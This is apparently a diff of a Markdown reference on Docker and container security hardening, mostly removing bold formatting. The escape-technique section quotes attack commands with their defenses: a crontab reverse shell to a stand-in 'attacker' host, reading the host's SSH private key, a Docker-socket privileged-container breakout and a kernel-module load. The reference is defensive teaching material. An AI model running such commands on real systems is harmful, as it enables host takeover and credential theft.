@@ -4,9 +4,9 @@
 
 | | |
 |---|---|
-| **Read this when** | Hardening a Dockerfile or image before it ships to production, investigating a privileged-container or container-escape finding, building image scanning and signing into a CI/CD pipeline |
-| **Start at** | [Container Security Fundamentals](#_1-container-security-fundamentals), [Dockerfile Security Best Practices](#_3-dockerfile-security-best-practices), [Container Escape Techniques and Defense](#_6-container-escape-techniques-and-defense) |
-| **Pairs with** | [KUBERNETES_SECURITY_REFERENCE.md](KUBERNETES_SECURITY_REFERENCE.md), [DEVSECOPS_REFERENCE.md](DEVSECOPS_REFERENCE.md), [SECRETS_MANAGEMENT_REFERENCE.md](SECRETS_MANAGEMENT_REFERENCE.md), [SUPPLY_CHAIN_SECURITY_REFERENCE.md](SUPPLY_CHAIN_SECURITY_REFERENCE.md) |
+| Read this when | Hardening a Dockerfile or image before it ships to production, investigating a privileged-container or container-escape finding, building image scanning and signing into a CI/CD pipeline |
+| Start at | [Container Security Fundamentals](#_1-container-security-fundamentals), [Dockerfile Security Best Practices](#_3-dockerfile-security-best-practices), [Container Escape Techniques and Defense](#_6-container-escape-techniques-and-defense) |
+| Pairs with | [KUBERNETES_SECURITY_REFERENCE.md](KUBERNETES_SECURITY_REFERENCE.md), [DEVSECOPS_REFERENCE.md](DEVSECOPS_REFERENCE.md), [SECRETS_MANAGEMENT_REFERENCE.md](SECRETS_MANAGEMENT_REFERENCE.md), [SUPPLY_CHAIN_SECURITY_REFERENCE.md](SUPPLY_CHAIN_SECURITY_REFERENCE.md) |
 
 ---
 
@@ -37,7 +37,7 @@ Namespaces provide isolation by giving each container its own view of system res
 
 | Namespace | Flag | Isolates |
 |-----------|------|----------|
-| `pid` | `CLONE_NEWPID` | Process IDs — container processes cannot see host PIDs |
+| `pid` | `CLONE_NEWPID` | Process IDs: container processes cannot see host PIDs |
 | `net` | `CLONE_NEWNET` | Network interfaces, routing tables, iptables rules |
 | `mnt` | `CLONE_NEWNS` | Filesystem mount points, prevents seeing host mounts |
 | `uts` | `CLONE_NEWUTS` | Hostname and NIS domain name |
@@ -80,27 +80,27 @@ services:
           memory: 256M
 ```
 
-**Security implications:**
+Security implications:
 - Without `--pids-limit`, a fork bomb can exhaust host PIDs
 - Without memory limits, OOM killer may kill critical host processes
-- cgroups v2 provides unified hierarchy — preferred for modern container runtimes
+- cgroups v2 provides unified hierarchy: preferred for modern container runtimes
 
 #### Linux Capabilities
 
 Capabilities break the monolithic root privilege into discrete units. Docker drops many by default:
 
-**Default Docker capability set (kept):**
+Default Docker capability set (kept):
 `CHOWN, DAC_OVERRIDE, FSETID, FOWNER, MKNOD, NET_RAW, SETGID, SETUID, SETFCAP, SETPCAP, NET_BIND_SERVICE, SYS_CHROOT, KILL, AUDIT_WRITE`
 
-**Dangerous capabilities (never grant unless required):**
+Dangerous capabilities (never grant unless required):
 
 | Capability | Risk |
 |------------|------|
-| `CAP_SYS_ADMIN` | Near-root — enables mount, cgroup manipulation, container escape |
+| `CAP_SYS_ADMIN` | Near-root: enables mount, cgroup manipulation, container escape |
 | `CAP_NET_ADMIN` | Modify routing tables, firewall rules, sniff traffic |
 | `CAP_SYS_PTRACE` | Trace/inject into any process on host (with `--pid=host`) |
-| `CAP_DAC_READ_SEARCH` | Bypass file permission checks — read any host file |
-| `CAP_NET_RAW` | Raw socket access — ARP spoofing, packet injection |
+| `CAP_DAC_READ_SEARCH` | Bypass file permission checks: read any host file |
+| `CAP_NET_RAW` | Raw socket access: ARP spoofing, packet injection |
 
 ```bash
 # Drop all capabilities, add only what is needed
@@ -148,7 +148,7 @@ docker run --security-opt seccomp=unconfined myapp:latest
 docker run --security-opt seccomp=default myapp:latest
 ```
 
-**Syscalls blocked by Docker default seccomp:**
+Syscalls blocked by Docker default seccomp:
 `acct, add_key, bpf, clock_adjtime, clock_settime, clone (with CLONE_NEWUSER), create_module, delete_module, finit_module, get_kernel_syms, init_module, ioperm, iopl, kcmp, kexec_file_load, kexec_load, keyctl, lookup_dcookie, mbind, mount, move_pages, nfsservctl, open_by_handle_at, perf_event_open, personality, pivot_root, process_vm_readv, process_vm_writev, ptrace, query_module, quotactl, reboot, request_key, set_mempolicy, setns, settimeofday, stime, swapon/off, sysfs, _sysctl, umount, umount2, unshare, uselib, userfaultfd, ustat, vm86, vm86old`
 
 ### Container vs. VM Isolation Comparison
@@ -163,7 +163,7 @@ docker run --security-opt seccomp=default myapp:latest
 | Resource overhead | Near-zero | Significant |
 | Storage | Layered (overlay2/devicemapper) | Virtual disk image |
 
-**Isolation strength ranking (weakest to strongest):**
+Isolation strength ranking (weakest to strongest):
 `Container > gVisor > Kata Containers > VM > Bare Metal`
 
 ### Docker Architecture
@@ -197,10 +197,10 @@ runc / runsc
   - Executes container init process
 ```
 
-**Security-relevant sockets:**
-- `/var/run/docker.sock` — Docker daemon Unix socket; anyone with access = root on host
-- `/run/containerd/containerd.sock` — containerd gRPC socket
-- containerd shim socket — process-specific, used in CVE-2020-15257
+Security-relevant sockets:
+- `/var/run/docker.sock`: Docker daemon Unix socket; anyone with access = root on host
+- `/run/containerd/containerd.sock`: containerd gRPC socket
+- containerd shim socket: process-specific, used in CVE-2020-15257
 
 ### Container Threat Model
 
@@ -255,7 +255,7 @@ skopeo copy docker://nginx:latest docker-archive:nginx.tar:latest
 
 ## 2. Docker Bench for Security
 
-Docker Bench for Security is an automated script that checks dozens of common best practices in deploying Docker in production, based on the **CIS Docker Benchmark**.
+Docker Bench for Security is an automated script that checks dozens of common best practices in deploying Docker in production, based on the CIS Docker Benchmark.
 
 ### Running the Benchmark
 
@@ -275,11 +275,11 @@ sudo sh docker-bench-security.sh -l /tmp/docker-bench-$(date +%Y%m%d).log
 sudo sh docker-bench-security.sh -c container_images,container_runtime
 ```
 
-**Output codes:**
-- `[PASS]` — Check passed
-- `[WARN]` — Check failed, needs remediation
-- `[INFO]` — Informational, review recommended
-- `[NOTE]` — Manual review required
+Output codes:
+- `[PASS]`: Check passed
+- `[WARN]`: Check failed, needs remediation
+- `[INFO]`: Informational, review recommended
+- `[NOTE]`: Manual review required
 
 ### Key Check Categories
 
@@ -340,7 +340,7 @@ augenrules --load
 }
 ```
 
-> **Currency note (verified 2026-09-29):** CIS checks 2.14 and 4.5 (and the hardening checklist below) call for **Docker Content Trust**, which depends on the upstream **Notary v1** server (`notary.docker.io`). Notary v1 is no longer maintained, and Docker Content Trust is being **fully retired by December 8, 2026** (phased brownouts begin July 2026). For new work, sign and verify images with **Sigstore Cosign** or the **Notary Project's Notation (Notary v2)** — both store OCI-native signatures in the registry with no separate trust server (see the Notation workflow later in this reference). Source: <https://www.docker.com/blog/docker-content-trust-retirement-and-migration-guidance/>.
+> Currency note (verified 2026-09-29): CIS checks 2.14 and 4.5 (and the hardening checklist below) call for Docker Content Trust, which depends on the upstream Notary v1 server (`notary.docker.io`). Notary v1 is no longer maintained, and Docker Content Trust is being fully retired by December 8, 2026 (phased brownouts begin July 2026). For new work, sign and verify images with Sigstore Cosign or the Notary Project's Notation (Notary v2) — both store OCI-native signatures in the registry with no separate trust server (see the Notation workflow later in this reference). Source: <https://www.docker.com/blog/docker-content-trust-retirement-and-migration-guidance/>.
 
 #### Section 4: Container Images and Build Files
 
@@ -384,7 +384,7 @@ augenrules --load
 
 ## 3. Dockerfile Security Best Practices
 
-### Hadolint — Dockerfile Linter
+### Hadolint: Dockerfile Linter
 
 ```bash
 # Install hadolint
@@ -419,14 +419,14 @@ trustedRegistries:
   - ghcr.io
 ```
 
-**Key hadolint rules:**
+Key hadolint rules:
 
 | Rule | Description |
 |------|-------------|
 | DL3002 | Last USER should not be root |
 | DL3003 | Use WORKDIR instead of cd |
 | DL3006 | Always tag the version of the image used |
-| DL3007 | Using latest is prone to errors — pin the version |
+| DL3007 | Using latest is prone to errors: pin the version |
 | DL3008 | Pin versions in apt-get install |
 | DL3013 | Pin versions in pip install |
 | DL3020 | Use COPY instead of ADD for file copying |
@@ -591,7 +591,7 @@ build/
 
 ## 4. Container Image Scanning
 
-### Trivy — Comprehensive Vulnerability Scanner
+### Trivy: Comprehensive Vulnerability Scanner
 
 ```bash
 # Install Trivy
@@ -628,7 +628,7 @@ trivy sbom --format spdx-json image myapp:latest
 trivy image --scanners secret myapp:latest
 ```
 
-**.trivyignore file (suppress known false positives):**
+.trivyignore file (suppress known false positives):
 
 ```
 # CVE-2022-1234 - Not applicable to our use case
@@ -636,7 +636,7 @@ CVE-2022-1234
 CVE-2023-5678 apt
 ```
 
-**Trivy in CI (GitHub Actions):**
+Trivy in CI (GitHub Actions):
 
 ```yaml
 - name: Run Trivy vulnerability scanner
@@ -655,7 +655,7 @@ CVE-2023-5678 apt
     sarif_file: 'trivy-results.sarif'
 ```
 
-### Grype — Anchore Vulnerability Scanner
+### Grype: Anchore Vulnerability Scanner
 
 ```bash
 # Install Grype
@@ -758,7 +758,7 @@ cosign verify-attestation   --type cyclonedx   --key cosign.pub   myregistry.io/
 # - run: cosign sign --yes myregistry.io/myimage:${{ github.sha }}
 ```
 
-**Policy enforcement with Sigstore Policy Controller:**
+Policy enforcement with Sigstore Policy Controller:
 
 ```yaml
 apiVersion: policy.sigstore.dev/v1beta1
@@ -781,7 +781,7 @@ spec:
 
 ## 5. Container Runtime Security
 
-### Falco — eBPF Runtime Security
+### Falco: eBPF Runtime Security
 
 Falco detects anomalous container behavior using eBPF probes and pre-defined rules.
 
@@ -903,7 +903,7 @@ docker run --rm -it   --privileged   -v /var/run/docker.sock:/host/var/run/docke
   tags: [container, docker, escape]
 ```
 
-#### Falco Sidekick — Alert Routing
+#### Falco Sidekick: Alert Routing
 
 ```yaml
 # falcosidekick values.yaml
@@ -983,7 +983,7 @@ cat > seccomp-minimal.json << 'EOF'
 EOF
 ```
 
-### gVisor — Kernel-Level Isolation
+### gVisor: Kernel-Level Isolation
 
 ```bash
 # Install gVisor runsc
@@ -1003,7 +1003,7 @@ docker run --runtime=runsc alpine uname -r
 # Output: 4.4.0 (gVisor kernel version, not host)
 ```
 
-### Kata Containers — VM-Level Isolation
+### Kata Containers: VM-Level Isolation
 
 ```bash
 # Install kata-containers
@@ -1013,7 +1013,7 @@ snap install kata-containers --classic
 docker run --runtime=kata-runtime myapp:latest
 ```
 
-**Runtime isolation comparison:**
+Runtime isolation comparison:
 
 | Runtime | Isolation | Performance | Use Case |
 |---------|-----------|-------------|----------|
@@ -1050,7 +1050,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-**Defense:**
+Defense:
 - Never use `--privileged`
 - Use Pod Security Standards: Restricted profile
 - OPA/Gatekeeper or Kyverno policy to deny privileged containers
@@ -1067,7 +1067,7 @@ cat /host/root/.ssh/id_rsa
 echo '* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1' >> /host/etc/crontab
 ```
 
-**Defense (Kyverno policy):**
+Defense (Kyverno policy):
 
 ```yaml
 apiVersion: kyverno.io/v1
@@ -1101,7 +1101,7 @@ ls -la /var/run/docker.sock
 curl -s --unix-socket /var/run/docker.sock   -X POST "http://localhost/containers/create"   -H "Content-Type: application/json"   -d '{"Image":"alpine","Cmd":["chroot","/host","bash"],"Binds":["/:/host"],"Privileged":true}'
 ```
 
-**Defense:**
+Defense:
 - Never mount `/var/run/docker.sock` into containers
 - Use kaniko, buildah, or img for container builds in CI
 - Monitor with Falco rule: Docker socket accessed from container
@@ -1118,24 +1118,24 @@ insmod evil.ko
 # Or mount-based cgroup escape (same as privileged container technique)
 ```
 
-**Defense:**
+Defense:
 ```bash
 # Drop ALL capabilities, add only required
 docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp:latest
 ```
 
-### CVE-2019-5736 — runc Container Escape
+### CVE-2019-5736: runc Container Escape
 
-**Affected:** runc < 1.0-rc6 (Docker 18.09.1 and earlier)
+Affected: runc < 1.0-rc6 (Docker 18.09.1 and earlier)
 
-**Attack:** Overwrites host runc binary by abusing `/proc/self/exe` symlink during `docker exec`. The malicious container replaces the runc binary, and when runc executes again, arbitrary code runs on the host as root.
+Attack: Overwrites host runc binary by abusing `/proc/self/exe` symlink during `docker exec`. The malicious container replaces the runc binary, and when runc executes again, arbitrary code runs on the host as root.
 
-**Remediation:**
+Remediation:
 ```bash
 apt-get update && apt-get upgrade runc containerd
 ```
 
-**Detection Falco rule:**
+Detection Falco rule:
 ```yaml
 - rule: Runc escape attempt
   condition: >
@@ -1144,13 +1144,13 @@ apt-get update && apt-get upgrade runc containerd
   priority: CRITICAL
 ```
 
-### CVE-2020-15257 — containerd Shim API Exposure
+### CVE-2020-15257: containerd Shim API Exposure
 
-**Affected:** containerd < 1.3.9, 1.4.x < 1.4.3
+Affected: containerd < 1.3.9, 1.4.x < 1.4.3
 
-**Attack:** Containers sharing the host network namespace can connect to the containerd shim abstract Unix socket and elevate privileges.
+Attack: Containers sharing the host network namespace can connect to the containerd shim abstract Unix socket and elevate privileges.
 
-**Remediation:**
+Remediation:
 ```bash
 # Upgrade containerd
 apt-get upgrade containerd
@@ -1255,9 +1255,9 @@ networks:
     internal: true    # No external internet access
 ```
 
-**Benefits of user-defined networks:**
+Benefits of user-defined networks:
 1. Automatic DNS resolution by container name
-2. Better isolation — containers can only reach containers in same network
+2. Better isolation: containers can only reach containers in same network
 3. ICC is per-network, not global
 
 ### iptables Rules Created by Docker
@@ -1400,19 +1400,19 @@ mkdir -p /etc/docker/certs.d/myregistry.example.com:5000
 cp ca.crt /etc/docker/certs.d/myregistry.example.com:5000/ca.crt
 ```
 
-### Harbor — Enterprise Open Source Registry
+### Harbor: Enterprise Open Source Registry
 
 ```bash
 helm repo add harbor https://helm.goharbor.io
 helm install harbor harbor/harbor   --namespace harbor --create-namespace   --set externalURL=https://registry.example.com   --set expose.tls.enabled=true   --set trivy.enabled=true   --set notary.enabled=true
 ```
 
-**Harbor Security Features:**
+Harbor Security Features:
 
 | Feature | Description |
 |---------|-------------|
 | Trivy Integration | Scan images on push; block deployment if critical vulnerabilities found |
-| Image Signing | Cosign/Notary v2 enforcement — reject unsigned images |
+| Image Signing | Cosign/Notary v2 enforcement: reject unsigned images |
 | RBAC | System Admin, Project Admin, Developer, Guest roles per project |
 | Project Quotas | Storage and image count limits per project |
 | Replication | Policy-based replication between registries |
@@ -1420,7 +1420,7 @@ helm install harbor harbor/harbor   --namespace harbor --create-namespace   --se
 | Retention Policy | Auto-delete old/untagged images based on rules |
 | Immutable Tags | Prevent overwriting existing image tags |
 
-### Notary v2 (notation) — Image Signing
+### Notary v2 (notation): Image Signing
 
 ```bash
 # Install notation CLI
@@ -1456,7 +1456,7 @@ EOF
 
 ### Supply Chain Security: SLSA for Container Images
 
-**SLSA (Supply-chain Levels for Software Artifacts) levels for containers:**
+SLSA (Supply-chain Levels for Software Artifacts) levels for containers:
 
 | Level | Requirements |
 |-------|-------------|
@@ -1866,7 +1866,7 @@ services:
 
 ### CIS Docker Benchmark v1.6 Compliance Checklist
 
-> **Currency note (2026-09):** the current CIS Docker Benchmark is **v1.8.0** (Jul 2025). The checklist below tracks v1.6 section IDs; verify against v1.8.0 before using as audit evidence.
+> Currency note (2026-09): the current CIS Docker Benchmark is v1.8.0 (Jul 2025). The checklist below tracks v1.6 section IDs; verify against v1.8.0 before using as audit evidence.
 
 | Section | Check | Status |
 |---------|-------|--------|
@@ -1910,7 +1910,7 @@ services:
 | Exploit Public-Facing App | T1190 | Exploit vulnerability in containerized app | WAF; Falco network rules; anomalous outbound connections |
 | Valid Accounts | T1078 | Use legitimate credentials to access registry | MFA enforcement; access log monitoring; UEBA |
 
-**Detection queries (Falco rules for MITRE techniques):**
+Detection queries (Falco rules for MITRE techniques):
 
 ```yaml
 # T1610: Deploy Container detection
